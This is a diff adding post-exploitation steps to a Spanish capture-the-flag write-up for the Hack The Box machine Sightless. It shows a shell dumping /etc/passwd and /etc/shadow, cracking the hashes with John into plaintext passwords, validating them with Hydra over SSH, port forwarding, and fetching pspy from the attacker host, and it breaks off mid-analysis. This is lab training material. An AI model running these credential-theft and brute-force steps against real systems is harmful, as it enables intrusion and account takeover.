@@ -1,4 +1,4 @@
-![imagen](https://github.com/user-attachments/assets/3199941f-a364-493b-855c-474481ba6cf5)---
+---
 description: >-
   Writeup de la máquina de dificultad fácil Sightless de la página https://hackthebox.eu
 title: Hack The Box - Sightless | (Difficulty Easy) - Linux
@@ -13,7 +13,10 @@ image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b82
 
 * Web enumeration
 * Abusing Template Injection to RCE (SQLPad 6.10.0 - CVE-2022-0944) [Gain access]
-* 
+* Cracking /etc/shadow users hashes to escape the container
+* Hydra brute force to validate passwords
+* Monitoring system process with pspy
+* SSH & Chisel Local Port Forwarding
 
 ## Enumeration
 
@@ -167,7 +170,7 @@ En el campo Database introduzco el payload que contiene la inyección acomodada 
 
 ![imagen](https://github.com/user-attachments/assets/1f6803ec-b88d-4908-a167-8e2e991b41a0)
 
-Por ultimo hago clic sobre Test y obtengo la reverse shell a lo que parece ser un contenedor, ya que la IP victima es la 10.10.11.32 y me encuentro en la 172.17.0.2
+Por ultimo hago clic sobre Test y obtengo la reverse shell como usuario root pero a un contenedor, ya que la IP victima es la 10.10.11.32 y me encuentro en la 172.17.0.2
 
 ![imagen](https://github.com/user-attachments/assets/d3a1df29-b740-4234-91ac-243e50530d1d)
 
@@ -179,4 +182,188 @@ bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 root@c184118df0a6:/var/lib/sqlpad# hostname -I
 172.17.0.2
+```
+
+## Post exploitation
+
+### Lateral Movement
+
+Tengo que buscar alguna forma de escapar del contenedor, comienzo visualizando los usuarios del sistema, veo que existen diferentes usuarios a parte de root
+
+```bash
+root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd | grep sh$
+cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+node:x:1000:1000::/home/node:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+```
+
+Listo el contenido que existen el directorio acutal y puedo ver un archivo curioso llamado sqlpad.sqlite, al listar su contenido a simple vista no observo ninguna fuga de información
+
+```bash
+root@c184118df0a6:/var/lib/sqlpad# ls
+cache
+sessions
+sqlpad.sqlite
+```
+Otra opción es intentar dumpear las credenciales de los usuarios fusionando con unshadow los archivos /etc/passwd y /etc/shadow e intentar creackear los hashes con John The Ripper
+
+```bash
+root@c184118df0a6:/var/lib/sqlpad#cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+```
+
+```bash
+root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+bin:*:19051:0:99999:7:::
+sys:*:19051:0:99999:7:::
+sync:*:19051:0:99999:7:::
+games:*:19051:0:99999:7:::
+man:*:19051:0:99999:7:::
+lp:*:19051:0:99999:7:::
+mail:*:19051:0:99999:7:::
+news:*:19051:0:99999:7:::
+uucp:*:19051:0:99999:7:::
+proxy:*:19051:0:99999:7:::
+www-data:*:19051:0:99999:7:::
+backup:*:19051:0:99999:7:::
+list:*:19051:0:99999:7:::
+irc:*:19051:0:99999:7:::
+gnats:*:19051:0:99999:7:::
+nobody:*:19051:0:99999:7:::
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+```
+
+```bash
+unshadow passwd shadow > unshadow
+```
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+blindside        (root)     
+insaneclownposse (michael)     
+2g 0:00:00:24 DONE (2025-01-16 17:17) 0.08203g/s 2415p/s 4053c/s 4053C/s kruimel..bluedolphin
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Soy capaz de cracker las contraseñas de el usuario root y el usuario michael, ahora utilizo hydra para validar dichas credenciales mediante fuerza bruta
+
+```bash
+ hydra -L users.txt -P creds.txt ssh://10.10.11.32
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:21:21
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
+[DATA] attacking ssh://10.10.11.32:22/
+[22][ssh] host: 10.10.11.32   login: michael   password: insaneclownposse
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:21:27
+```
+
+Como resultado obtengo que la contraseña insaneclownposse es válida para michael, por lo que conecto por ssh.
+
+```bash
+ssh michael@10.10.11.32
+The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
+ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
+michael@10.10.11.32's password: 
+Last login: Thu Jan 16 13:01:27 2025 from 10.10.14.136
+-bash-5.1$ whoami
+michael
+```
+
+### Privilege escalation
+
+Utilizo el comando netstat para mostrar información sobre las conexiones de red y puertos en uso
+
+```bash
+bash-5.1$ netstat -tulpen
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        23267      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      115        26732      -                   
+tcp        0      0 127.0.0.1:33393         0.0.0.0:*               LISTEN      1001       27682      -                   
+tcp        0      0 127.0.0.1:54155         0.0.0.0:*               LISTEN      1001       27323      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          26734      -                   
+tcp        0      0 127.0.0.1:34031         0.0.0.0:*               LISTEN      0          25929      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      115        26352      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          25005      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          24983      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          25023      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      0          24985      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      116        25955      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        23266      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          23306      -
+```
+
+Visualizo que se encuentra el puerto 8080 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo ssh para realizar un local port forwarding y traer el puerto 8080 de la máquina a mi puerto 8080.
+
+```bash
+ssh michael@10.10.11.32 -L 8080:127.0.0.1:8080 -N
+```
+
+Al acceder a http://127.0.0.1:8080 encuentro el panel de autenticación Froxlor pruebo con las credenciales obtenidas anteriormente pero niguna funciona
+
+![imagen](https://github.com/user-attachments/assets/f8888229-125c-4cc1-8c32-f02bd5a77d35)
+
+Utilzo pspy para monitorizar los todos los procesos del sistema sin necesidad de ser root
+
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```bash
+-bash-5.1$ wget http://10.10.14.160/pspy64
+--2025-01-16 17:14:10--  http://10.10.14.160/pspy64
+Connecting to 10.10.14.160:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: 'pspy64
+```
+
+Analizando los procesos observo un proceso de Google Chrome con la opción --remote-debugging-port=0, pero el número de puerto 0 le dice al sistema que seleccione automáticamente un puerto disponible, esta característica está destinada a los desarrolladores a depurar de forma remota aplicaciones web conectando herramientas de desarrollo a la instancia del navegador. 
+
+```bash
+2025/01/16 16:47:03 CMD: UID=1001  PID=1571   | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1522 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1737000097220498 --launc
+```
+
+
+
+```bash
+
 ```
